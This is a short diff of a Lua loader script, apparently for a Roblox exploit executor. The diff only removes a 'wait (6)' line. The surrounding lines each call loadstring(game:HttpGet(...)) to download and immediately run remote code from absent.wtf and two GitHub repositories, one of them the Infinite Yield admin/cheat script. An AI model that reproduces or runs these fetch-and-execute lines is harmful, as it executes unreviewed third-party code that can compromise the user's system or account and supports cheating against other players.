@@ -2,6 +2,5 @@ loadstring(game:HttpGet("https://absent.wtf/AKADMIN.lua"))()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
 
-wait (6)
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/losermancracker-byte/scripts/refs/heads/main/bundle%20ak%20autoexec"))()
